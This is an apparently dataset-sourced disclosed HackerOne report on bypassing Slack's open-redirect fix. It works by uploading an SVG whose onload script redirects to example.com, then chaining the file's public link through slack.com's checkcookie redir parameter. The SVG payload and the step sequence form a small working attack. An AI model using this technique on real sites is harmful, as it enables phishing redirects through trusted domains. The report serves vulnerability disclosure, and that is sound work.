---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '104087'
original_report_id: '104087'
title: Trick make all fixed open redirect links vulnerable again
weakness: Open Redirect
team_handle: slack
created_at: '2015-12-08T11:36:35.637Z'
disclosed_at: '2016-05-22T01:38:20.610Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 2
tags:
- hackerone
- open-redirect
---

# Trick make all fixed open redirect links vulnerable again

## Metadata

- HackerOne Report ID: 104087
- Weakness: Open Redirect
- Program: slack
- Disclosed At: 2016-05-22T01:38:20.610Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

this trick make all fixed open redirect links vulnerable again
in this resolved report "https://hackerone.com/reports/2622"
before fixing
this link "https://slack.com/checkcookie?redir=http://www.example.com" redirect victim to "http://www.example.com"

after fixing
this link "https://slack.com/checkcookie?redir=http://www.example.com" only redirect to "https://www.slack.com/" or "https://subdomain.slack.com/"

the trick
=
1- use slack account to upload .svg file contain this code
<code>
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<svg
 onload="window.location='http://www.example.com'"
 xmlns="http://www.w3.org/2000/svg">
</svg>
</code>

2-make public link for svg file "https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=7a6caed489"

3- complete link "https://slack.com/checkcookie?redir=https://files.slack.com/files-pri/T0E7QLVLL-F0G41EG2W/redirect.svg?pub_secret=7a6caed489"

4-when user click this link will redirect to "http://www.example.com"

in this accepted and Bounty report "https://hackerone.com/reports/2622"
when user click this link "https://slack.com/checkcookie?redir=http://www.example.com" the result is redirect user to "http://www.example.com"
in my report it's the same result

you should stop execute svg files and display its's code like  HTML files

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
